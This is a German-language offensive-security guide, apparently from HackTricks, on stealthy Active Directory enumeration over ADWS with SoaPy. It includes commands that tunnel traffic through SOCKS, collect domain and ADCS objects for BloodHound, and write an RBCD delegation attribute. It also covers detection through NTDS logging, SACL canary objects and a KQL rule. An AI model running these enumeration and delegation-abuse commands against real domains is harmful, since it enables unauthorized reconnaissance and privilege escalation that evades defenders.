# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Was ist ADWS?

Active Directory Web Services (ADWS) ist **standardmäßig auf jedem Domänencontroller seit Windows Server 2008 R2 aktiviert** und hört auf TCP **9389**. Trotz des Namens ist **kein HTTP beteiligt**. Stattdessen stellt der Dienst LDAP-ähnliche Daten über einen Stapel proprietärer .NET-Frame-Protokolle bereit:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Da der Datenverkehr in diesen binären SOAP-Frames gekapselt ist und über einen ungewöhnlichen Port reist, **ist die Enumeration über ADWS weitaus weniger wahrscheinlich, dass sie inspiziert, gefiltert oder signiert wird als klassischer LDAP/389 & 636 Verkehr**. Für Betreiber bedeutet dies:

* Stealthier Recon – Blaue Teams konzentrieren sich oft auf LDAP-Abfragen.
* Freiheit, von **nicht-Windows-Hosts (Linux, macOS)** zu sammeln, indem 9389/TCP durch einen SOCKS-Proxy getunnelt wird.
* Die gleichen Daten, die Sie über LDAP erhalten würden (Benutzer, Gruppen, ACLs, Schema usw.) und die Möglichkeit, **Schreibvorgänge** durchzuführen (z. B. `msDs-AllowedToActOnBehalfOfOtherIdentity` für **RBCD**).

> HINWEIS: ADWS wird auch von vielen RSAT GUI/PowerShell-Tools verwendet, sodass der Datenverkehr mit legitimen Administrationsaktivitäten vermischt werden kann.

## SoaPy – Native Python-Client

[SoaPy](https://github.com/logangoins/soapy) ist eine **vollständige Neurealisierung des ADWS-Protokollstapels in reinem Python**. Es erstellt die NBFX/NBFSE/NNS/NMF-Frames bytegenau und ermöglicht das Sammeln von Unix-ähnlichen Systemen, ohne die .NET-Laufzeit zu berühren.

### Hauptmerkmale

* Unterstützt **Proxying über SOCKS** (nützlich von C2-Implantaten).
* Fein abgestufte Suchfilter identisch zu LDAP `-q '(objectClass=user)'`.
* Optionale **Schreib**-Operationen ( `--set` / `--delete` ).
* **BOFHound-Ausgabemodus** für die direkte Eingabe in BloodHound.
* `--parse`-Flag zur Verschönerung von Zeitstempeln / `userAccountControl`, wenn menschliche Lesbarkeit erforderlich ist.

### Installation (Operator-Host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

Der folgende Workflow zeigt, wie man **Domain- und ADCS-Objekte** über ADWS enumeriert, sie in BloodHound JSON konvertiert und nach zertifikatbasierten Angriffspfaden sucht – alles von Linux aus:

1. **Tunnel 9389/TCP** vom Zielnetzwerk zu deinem Rechner (z.B. über Chisel, Meterpreter, SSH dynamisches Port-Forwarding usw.). Exportiere `export HTTPS_PROXY=socks5://127.0.0.1:1080` oder verwende SoaPy’s `--proxyHost/--proxyPort`.

2. **Sammle das Root-Domain-Objekt:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Sammeln Sie ADCS-bezogene Objekte aus dem Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **In BloodHound umwandeln:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Laden Sie die ZIP-Datei** in die BloodHound-GUI hoch und führen Sie Cypher-Abfragen wie `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` aus, um Zertifikatseskalationspfade (ESC1, ESC8 usw.) offenzulegen.

### Schreiben von `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombinieren Sie dies mit `s4u2proxy`/`Rubeus /getticket` für eine vollständige **ressourcenbasierte eingeschränkte Delegation**-Kette.

## Erkennung & Härtung

### Ausführliches ADDS-Logging

Aktivieren Sie die folgenden Registrierungsschlüssel auf Domänencontrollern, um teure / ineffiziente Suchen von ADWS (und LDAP) sichtbar zu machen:
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Ereignisse erscheinen unter **Directory-Service** mit dem vollständigen LDAP-Filter, selbst wenn die Abfrage über ADWS eingegangen ist.

### SACL Canary Objects

1. Erstellen Sie ein Dummy-Objekt (z. B. deaktivierter Benutzer `CanaryUser`).
2. Fügen Sie eine **Audit** ACE für das _Everyone_ Prinzipal hinzu, die auf **ReadProperty** geprüft wird.
3. Jedes Mal, wenn ein Angreifer `(servicePrincipalName=*)`, `(objectClass=user)` usw. ausführt, gibt der DC **Event 4662** aus, das die echte Benutzer-SID enthält – selbst wenn die Anfrage proxyisiert oder von ADWS stammt.

Beispiel für eine vorgefertigte Regel von Elastic:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Tooling Summary

| Zweck | Tool | Anmerkungen |
|-------|------|-------------|
| ADWS Enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lesen/schreiben |
| BloodHound Ingest | [BOFHound](https://github.com/bohops/BOFHound) | Konvertiert SoaPy/ldapsearch Protokolle |
| Zertifikat Kompromittierung | [Certipy](https://github.com/ly4k/Certipy) | Kann über denselben SOCKS proxyisiert werden |

## References

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
